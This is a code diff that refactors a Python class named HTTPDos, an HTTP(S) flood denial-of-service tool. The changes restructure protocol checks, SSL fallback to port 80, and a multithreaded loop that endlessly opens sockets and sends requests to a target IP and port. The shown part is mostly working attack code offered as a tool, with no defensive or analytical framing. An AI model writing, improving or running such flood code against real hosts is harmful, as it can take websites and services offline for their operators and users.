@@ -30,38 +30,55 @@ class HTTPDos():
             'POST': self.post_http_request,
         }
         if self.http_method not in methods:
-            raise ValueError(f"[!] Unsupported HTTP method: {self.http_method}")
+            raise ValueError(
+                f"[!] Unsupported HTTP method: {self.http_method}")
         return methods[self.http_method]
 
-    def http_flood(self):
+    def start_flood(self):
         """
         HTTP(S) flood
         """
         color_text('green', '[+] Connect to send request')
 
-        if self.protocol == 'https':
-            self.ssl_available = self.test_ssl_connection()
+        try:
+            if self.protocol not in ('http', 'https'):
+                raise ValueError(f"Unsupported protocol: {self.protocol}")
 
-            if self.ssl_available:
-                color_text('green', '[+] Sending request\n')
-                self.run_attack_loop()
-            else:
-                self.target_port = 80
-                if self.send_packet:
-                    color_text('blue', f'[*] {self.target_ip} with HTTP on port {self.target_port} is available\n')
-                    while True:
-                        if (match := input(f"Do you want send packet to {self.target_ip} on port {self.target_port} ? [yes, no] : ").strip().lower()) in ('yes', 'no'):
-                            if match == 'no':
-                                sys.exit('Bye !')
-                            break
+            if self.protocol == 'https':
+                self.ssl_available = self.test_ssl_connection()
 
+                if self.ssl_available:
                     color_text('green', '[+] Sending request\n')
                     self.run_attack_loop()
-        elif self.protocol == 'http':
-            color_text('green', '[+] Sending request\n')
-            self.run_attack_loop()
+                else:
+                    self.target_port = 80
+                    if self.send_packet:
+                        color_text(
+                            'blue', f'[*] {self.target_ip} with HTTP on port {self.target_port} is available\n')
+                        while True:
+                            if (match := input(f"Do you want send packet to {self.target_ip} on port {self.target_port} ? [yes, no] : ").strip().lower()) in ('yes', 'no'):
+                                if match == 'no':
+                                    sys.exit('Bye !')
+                                break
+
+                        color_text('green', '[+] Sending request\n')
+                        self.run_attack_loop()
+            elif self.protocol == 'http':
+                color_text('green', '[+] Sending request\n')
+                self.run_attack_loop()
+
+        except Exception as e:
+            color_text('red', f'[!] Error: {e}')
 
     def run_attack_loop(self):
+        if self.monothread:
+            return self.compile_attack_loop()
+        else:
+            for _ in range(self.threads):
+                thread = Thread(target=self.compile_attack_loop)
+                thread.start()
+
+    def compile_attack_loop(self):
         try:
             while True:
                 self.send_packet()
@@ -72,12 +89,12 @@ class HTTPDos():
 
     def send_packet(self):
         sock = socket.socket(socket.AF_INET, TCP)
-        
+
         if self.ssl_available:
             context = ssl.create_default_context()
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock = context.wrap_socket(sock, server_hostname=self.target_ip)    
+            sock = context.wrap_socket(sock, server_hostname=self.target_ip)
 
         sock.connect((self.target_ip, self.target_port))
         # call var with () at the end to call function
@@ -180,18 +197,3 @@ class HTTPDos():
     def http_random_resource(self):
         """Generate random resource"""
         return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
-
-    def start_attack(self):
-        try:
-            if self.protocol not in ('http', 'https'):
-                raise ValueError(f"Unsupported protocol: {self.protocol}")
-            
-            if self.monothread:
-                return self.http_flood()
-                
-            for _ in range(self.threads):
-                thread = Thread(target=self.http_flood)
-                thread.start()
-                
-        except Exception as e:
-            color_text('red', f'[!] Error: {e}')
